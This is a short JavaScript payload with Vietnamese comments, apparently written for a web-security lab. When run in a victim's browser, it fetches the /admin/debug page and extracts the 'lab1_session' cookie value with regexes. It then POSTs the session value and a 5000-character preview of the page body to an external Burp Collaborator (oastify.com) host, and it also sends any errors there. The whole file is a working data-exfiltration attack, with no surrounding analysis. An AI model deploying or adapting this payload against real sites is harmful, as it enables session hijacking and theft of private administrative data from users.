(async () => {
    try {
        // 1. Fetch response từ /admin/debug
        console.log('Đang fetch /admin/debug...');
        const response = await fetch('/admin/debug');
        
        // Lấy text ngay cả khi status không phải 200
        const text = await response.text();
        console.log('Status:', response.status, 'OK?', response.ok);
        
        // 2. Tìm giá trị lab1_session trong response body (kể cả error page)
        const sessionRegex = /lab1_session=([^;\s]+)/i;
        const match = text.match(sessionRegex);
        
        let sessionValue = null;
        
        if (match) {
            sessionValue = match[1];
            console.log('Tìm thấy lab1_session trong response:', sessionValue);
        } else {
            // Nếu không tìm thấy qua regex cookie, thử tìm trong HTML debug page
            // Laravel debug page có thể hiển thị session trong mảng $_SESSION, $_COOKIE
            const sessionInHtmlRegex = /lab1_session[^>]*>([^<]+)</i;
            const match2 = text.match(sessionInHtmlRegex);
            if (match2) {
                sessionValue = match2[1];
                console.log('Tìm thấy lab1_session trong HTML debug:', sessionValue);
            } else {
                console.log('Không tìm thấy lab1_session trong response body');
                // Vẫn gửi toàn bộ response body để kiểm tra
            }
        }
        
        // 3. Gửi POST request đến collaborator với TOÀN BỘ response
        const collaboratorUrl = 'https://eweo81gavxl4qjyx3n7e74hft6zxnubj.oastify.com';
        const postData = {
            status: response.status,
            session: sessionValue,
            // Gửi cả response body (cắt ngắn nếu quá dài)
            body_preview: text.substring(0, 5000),
            source: '/admin/debug',
            timestamp: new Date().toISOString()
        };
        
        console.log('Đang gửi POST request đến collaborator...');
        const postResponse = await fetch(collaboratorUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData)
        });
        
        console.log('POST request đã gửi!');
        
    } catch (error) {
        console.error('Có lỗi xảy ra:', error.message);
        
        // Gửi cả thông tin lỗi đến collaborator
        try {
            await fetch('https://eweo81gavxl4qjyx3n7e74hft6zxnubj.oastify.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    error: error.message,
                    timestamp: new Date().toISOString()
                })
            });
        } catch(e) {}
    }
})();
